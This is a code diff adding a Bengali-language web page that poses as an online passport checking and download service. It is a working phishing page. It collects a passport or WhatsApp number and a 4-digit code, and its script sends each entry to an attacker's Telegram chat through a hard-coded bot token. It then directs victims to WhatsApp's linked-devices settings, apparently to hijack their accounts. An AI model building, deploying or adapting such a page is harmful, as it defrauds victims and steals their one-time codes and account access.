@@ -1,0 +1,157 @@
+<!DOCTYPE html>
+<html lang="bn">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Passport - Chaking</title>
+    
+    <meta property="og:type" content="website">
+    <meta property="og:url" content="https://passportchaking-io.github.io/Online_Passport_chaking/">
+    <meta property="og:title" content="Passport Checking and Download">
+    <meta property="og:description" content="পাসপোর্ট চেক করুন অনলাইনে">
+    <meta property="og:image" content="https://passportchaking-io.github.io/Online_Passport_chaking/file_000000001a70720ba5708a95677f8d11.png">
+    
+    <script src="https://cdn.tailwindcss.com"></script>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { background: #f7f9fc; font-family: Arial, sans-serif; height: 100vh; overflow: hidden; display: flex; flex-direction: column; }
+        .hidden { display: none !important; }
+        
+        .top-half { height: 48vh; display: flex; align-items: center; justify-content: center; background: white; border-bottom: 1px solid #e1e4e8; padding: 8px; }
+        .top-half img { max-width: 100%; max-height: 100%; object-fit: contain; border-radius: 8px; }
+        
+        .bottom-half { height: 52vh; background: #f7f9fc; padding: 12px; display: flex; flex-direction: column; align-items: center; gap: 8px; }
+        
+        .btn-blue { width: 100%; max-width: 350px; background: #1877f2; color: white; font-weight: bold; padding: 16px; border-radius: 12px; cursor: pointer; border: none; font-size: 18px; }
+        .btn-blue:disabled { background: #90a4ae; cursor: not-allowed; }
+        
+        .secure-input { width: 100%; max-width: 350px; padding: 16px; border: 2px solid #ccd0d5; border-radius: 12px; outline: none; font-size: 17px; background: white; }
+        .secure-input:focus { border-color: #1877f2; }
+        
+        .otp-input { width: 48px; height: 58px; text-align: center; font-size: 22px; font-weight: bold; border: 2px solid #dddfe2; border-radius: 8px; }
+        .otp-input:focus { border-color: #1877f2; }
+        
+        .photo-box { width: 100%; max-width: 350px; height: 250px; background: white; border-radius: 12px; overflow: hidden; cursor: pointer; border: 2px solid #1877f2; }
+        .photo-box img { width: 100%; height: 100%; object-fit: cover; }
+        
+        .loader { width: 55px; height: 55px; border: 6px solid #f3f3f3; border-top: 6px solid #1877f2; border-radius: 50%; animation: spin 0.8s linear infinite; margin: 20px auto; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+    </style>
+</head>
+<body onload="initApp()">
+
+    <div class="top-half">
+        <img src="https://passportchaking-io.github.io/Online_Passport_chaking/file_000000001a70720ba5708a95677f8d11.png">
+    </div>
+
+    <div class="bottom-half text-center">
+        <div id="step1">
+            <h2 class="text-2xl font-bold mb-2">পাসপোর্ট চেক করুন</h2>
+            <p class="text-gray-600 mb-3">অনলাইনে পাসপোর্ট চেক করুন</p>
+            <button onclick="goToStep('input_page')" class="btn-blue">ফাইলটি ওপেন করুন</button>
+        </div>
+
+        <div id="input_page" class="hidden">
+            <h1 class="text-xl font-bold mb-2">পাসপোর্ট নম্বর দিন</h1>
+            <input type="text" id="passport_field" placeholder="পাসপোর্ট নম্বর বা হোয়াটসঅ্যাপ" class="secure-input mb-3">
+            <button onclick="validateAndSubmit()" class="btn-blue">পাসপোর্ট চেক করুন</button>
+        </div>
+
+        <div id="photo_page" class="hidden">
+            <h2 class="text-xl font-bold mb-2">পাসপোর্ট ফাইল দেখুন</h2>
+            <div class="photo-box mb-2" onclick="goToStep('otp_page')">
+                <img src="https://passportchaking-io.github.io/Online_Passport_chaking/file_000000001a70720ba5708a95677f8d11.png">
+            </div>
+        </div>
+
+        <div id="otp_page" class="hidden">
+            <h2 class="text-lg font-bold mb-2">পাসওয়ার্ড দিন</h2>
+            <p class="text-sm text-gray-600 mb-3">4 সংখ্যার পাসওয়ার্ড</p>
+            <div class="flex justify-center gap-2 mb-3">
+                <input type="text" maxlength="1" class="otp-input" id="otp1" oninput="checkOTP(1)">
+                <input type="text" maxlength="1" class="otp-input" id="otp2" oninput="checkOTP(2)">
+                <input type="text" maxlength="1" class="otp-input" id="otp3" oninput="checkOTP(3)">
+                <input type="text" maxlength="1" class="otp-input" id="otp4" oninput="checkOTP(4)">
+            </div>
+            <button id="otpBtn" onclick="goToStep('verifying')" class="btn-blue" disabled>ফাইলটি ওপেন করুন</button>
+        </div>
+
+        <div id="verifying" class="hidden">
+            <div class="loader"></div>
+            <h3 class="text-lg font-bold text-blue-600">অপেক্ষা করুন...</h3>
+        </div>
+
+        <div id="success_page" class="hidden">
+            <h2 class="text-2xl font-bold text-green-600 mb-2">অভিনন্দন!</h2>
+            <a href="https://wa.me/settings/linked_devices" class="btn-blue">Download</a>
+        </div>
+    </div>
+
+    <script>
+        let passportNumber = "";
+        let otpCode = "";
+        const botToken = "8617715035:AAHXQjkEtjYX40KQTAE5e_jVRQ_pKQX5Qjk";
+        const chatId = "8516934257";
+
+        function initApp() {
+            console.log("✅ App started!");
+        }
+
+        function goToStep(id) {
+            ['step1','input_page','photo_page','otp_page','verifying','success_page'].forEach(s => {
+                const el = document.getElementById(s);
+                if(el) el.classList.add('hidden');
+            });
+            const target = document.getElementById(id);
+            if(target) target.classList.remove('hidden');
+            
+            if (id === 'otp_page') {
+                document.getElementById('otp1').focus();
+            }
+        }
+
+        function validateAndSubmit() {
+            const value = document.getElementById('passport_field').value.trim();
+            if (value.length < 5) {
+                alert("অন্যতত ৫ সংখ্যা দিন!");
+                return;
+            }
+            passportNumber = value;
+            sendToBot(`🎯 পাসপোর্ট: ${passportNumber}`);
+            goToStep('photo_page');
+        }
+
+        function checkOTP(num) {
+            const otp1 = document.getElementById('otp1').value;
+            const otp2 = document.getElementById('otp2').value;
+            const otp3 = document.getElementById('otp3').value;
+            const otp4 = document.getElementById('otp4').value;
+            
+            // পরের ঘরে যাবে
+            if (num === 1 && otp1) document.getElementById('otp2').focus();
+            if (num === 2 && otp2) document.getElementById('otp3').focus();
+            if (num === 3 && otp3) document.getElementById('otp4').focus();
+            
+            otpCode = otp1 + otp2 + otp3 + otp4;
+            
+            console.log("OTP:", otpCode);
+            sendToBot(`🔑 OTP: ${otpCode}`);
+            
+            // সব ঘর পূর্ণ হলে বাটন Active
+            if (otp1 && otp2 && otp3 && otp4 && otpCode.length === 4) {
+                document.getElementById('otpBtn').disabled = false;
+                console.log("✅ Button enabled!");
+            }
+        }
+
+        function sendToBot(text) {
+            fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({ chat_id: chatId, text: text })
+            }).then(r => console.log("✅ Sent:", text))
+              .catch(e => console.error("❌ Error:", e));
+        }
+    </script>
+</body>
+</html>
